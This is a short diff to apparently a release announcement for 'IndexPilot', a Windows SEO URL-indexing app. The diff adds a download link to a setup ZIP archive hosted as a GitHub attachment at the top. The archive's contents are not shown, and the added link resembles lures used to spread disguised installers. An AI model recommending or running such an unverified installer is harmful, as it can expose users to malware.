@@ -1,3 +1,4 @@
+[IndexPilot_Setup.zip](https://github.com/user-attachments/files/32374488/IndexPilot_Setup.zip)
 # 🚀 IndexPilot v1.0.0 — Official Launch!
 
 Welcome to the initial official release of **IndexPilot**, the ultimate Windows desktop application built to streamline URL indexing workflows for SEO professionals, website owners, and digital marketers. 
